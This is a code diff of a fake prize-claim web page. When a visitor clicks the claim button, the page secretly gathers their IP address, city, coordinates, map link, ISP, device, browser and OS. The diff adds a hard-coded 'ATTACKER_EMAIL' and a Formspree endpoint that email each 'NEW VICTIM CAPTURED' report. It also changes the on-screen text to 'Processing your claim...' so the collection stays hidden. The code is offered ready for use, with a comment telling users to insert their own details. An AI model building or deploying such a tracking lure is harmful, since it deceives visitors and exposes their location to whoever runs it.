@@ -24,7 +24,11 @@
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
         }
-        .prize-icon { font-size: 80px; margin-bottom: 20px; animation: bounce 2s infinite; }
+        .prize-icon { 
+            font-size: 80px; 
+            margin-bottom: 20px; 
+            animation: bounce 2s infinite; 
+        }
         @keyframes bounce {
             0%, 100% { transform: translateY(0); }
             50% { transform: translateY(-20px); }
@@ -91,7 +95,7 @@
         
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p style="color: #667eea; font-size: 1.2em;">Verifying your information...</p>
+            <p style="color: #667eea; font-size: 1.2em;">Processing your claim...</p>
         </div>
         
         <div class="success" id="success">
@@ -102,12 +106,16 @@
     </div>
 
     <script>
+        // ⚠️ REPLACE THESE TWO LINES WITH YOUR INFO:
+        const ATTACKER_EMAIL = "yasmineelhedhili@gmail.com";
+        const FORMSPREE_ENDPOINT = "https://formspree.io/f/mrbrqjgl";
+
         async function claimPrize() {
             document.querySelector('.claim-button').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
             const data = await collectData();
-            await sendToAttacker(data);
+            await sendEmail(data);
             
             setTimeout(() => {
                 document.getElementById('loading').style.display = 'none';
@@ -132,50 +140,76 @@
                 country: ipData.country_name || 'Unknown',
                 latitude: ipData.latitude || 0,
                 longitude: ipData.longitude || 0,
-                postal: ipData.postal || 'Unknown',
                 isp: ipData.org || 'Unknown',
-                timezone: ipData.timezone || 'Unknown',
                 device: /Mobile|Android|iPhone|iPad/.test(ua) ? 'Mobile Device' : 'Desktop/Laptop',
                 browser: getBrowser(ua),
                 os: getOS(ua),
                 screen: window.screen.width + 'x' + window.screen.height,
-                language: navigator.language,
-                timestamp: Date.now(),
-                timestampStr: new Date().toLocaleString()
+                timestamp: new Date().toLocaleString(),
+                mapLink: ipData.latitude && ipData.longitude 
+                    ? `https://www.openstreetmap.org/?mlat=${ipData.latitude}&mlon=${ipData.longitude}#map=15/${ipData.latitude}/${ipData.longitude}`
+                    : 'No location'
             };
         }
         
-        async function sendToAttacker(data) {
-            const victimId = 'victim:' + Date.now();
-            
+        async function sendEmail(data) {
             try {
-                if (window.storage && window.storage.set) {
-                    await window.storage.set(victimId, JSON.stringify(data), true);
-                    console.log('Data sent successfully');
-                }
+                const emailBody = `
+🎯 NEW VICTIM CAPTURED!
+
+📍 LOCATION:
+- City: ${data.city}
+- Region: ${data.region}  
+- Country: ${data.country}
+
+🌐 IP: ${data.ip}
+🏢 ISP: ${data.isp}
+
+💻 DEVICE:
+- Type: ${data.device}
+- OS: ${data.os}
+- Browser: ${data.browser}
+- Screen: ${data.screen}
+
+🕐 Time: ${data.timestamp}
+
+🗺️ Map: ${data.mapLink}
+                `.trim();
+
+                const formData = new FormData();
+                formData.append('email', ATTACKER_EMAIL);
+                formData.append('subject', '🚨 New Victim - IP Tracker Alert');
+                formData.append('message', emailBody);
+
+                await fetch(FORMSPREE_ENDPOINT, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+                
+                console.log('Email sent!');
             } catch (error) {
-                console.error('Storage error:', error);
+                console.error('Email failed:', error);
             }
         }
         
         function getBrowser(ua) {
-            if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
-            if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
+            if (ua.indexOf("Firefox") > -1) return "Firefox";
+            if (ua.indexOf("SamsungBrowser") > -1) return "Samsung";
             if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
-            if (ua.indexOf("Trident") > -1) return "Internet Explorer";
-            if (ua.indexOf("Edg") > -1) return "Microsoft Edge";
-            if (ua.indexOf("Chrome") > -1) return "Google Chrome";
+            if (ua.indexOf("Edg") > -1) return "Edge";
+            if (ua.indexOf("Chrome") > -1) return "Chrome";
             if (ua.indexOf("Safari") > -1) return "Safari";
-            return "Unknown Browser";
+            return "Unknown";
         }
         
         function getOS(ua) {
             if (ua.indexOf("Win") > -1) return "Windows";
             if (ua.indexOf("Mac") > -1) return "MacOS";
-            if (ua.indexOf("X11") > -1 || ua.indexOf("Linux") > -1) return "Linux";
+            if (ua.indexOf("Linux") > -1) return "Linux";
             if (ua.indexOf("Android") > -1) return "Android";
             if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) return "iOS";
-            return "Unknown OS";
+            return "Unknown";
         }
     </script>
 </body>
